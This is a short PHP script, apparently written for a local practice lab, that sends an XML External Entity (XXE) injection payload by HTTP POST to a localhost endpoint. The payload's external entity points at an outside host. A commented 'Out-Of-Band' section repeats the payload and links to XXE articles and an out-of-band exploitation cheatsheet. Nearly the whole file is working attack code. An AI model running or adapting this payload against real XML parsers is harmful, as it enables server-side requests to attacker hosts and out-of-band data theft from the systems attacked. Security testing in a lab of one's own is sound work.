<?php
include_once "includer.php";
#https://canyoupwn.me/tr-xml-external-entity-xxe/
#https://pentestmag.com/exploiting-the-entity-xme-xml-external-entity-injection/

function sendPost(){

    $xml = <<<XML
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE own [ <!ELEMENT own ANY >
    <!ENTITY own SYSTEM "http://XXE.okanalan.engineer/" >]>
    <reset>
        <login>&own;</login>
        <secret>password</secret>
    </reset>
    XML;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_URL, "http://localhost:8080/JotPot/xxe_2.php");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
    $data = curl_exec($ch);

    if(curl_errno($ch)) {
        print curl_error($ch);
    } else {
        echo "Response: <br>" . $data;
    }
    curl_close($ch);
}

sendPost();

/* 



##### Out-Of-Band ######

arkakapı 8.sayı server ayarları
    $xml = <<<XML
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE own [ <!ELEMENT own ANY >
    <!ENTITY own SYSTEM "http://xxe.okanalan.engineer/" >]>
    <reset>
        <login>&own;</login>
        <secret>password</secret>
    </reset>
    XML;

https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/

https://www.notsosecure.com/oob-exploitation-cheatsheet/

*/

?>


